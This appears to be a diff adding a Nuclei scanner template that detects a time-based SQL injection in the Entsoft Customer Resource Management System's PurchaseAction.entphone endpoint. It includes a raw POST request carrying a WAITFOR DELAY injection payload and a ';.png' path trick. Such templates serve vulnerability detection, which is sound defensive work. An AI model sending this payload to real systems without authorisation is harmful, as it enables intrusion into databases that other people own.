@@ -1,0 +1,41 @@
+id: entersoft-customer-resource-management-sqli
+info:
+  name: SQL Injection in Entsoft Customer Resource Management System
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL Injection vulnerability in the Entsoft Customer Resource Management System (PurchaseAction.entphone).
+    The vulnerability is triggered by injecting a delay-based SQL payload and measuring the response time.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        modNum=1';WAITFOR DELAY '0:0:{{t1}}'--+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"state\":\"3\""
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
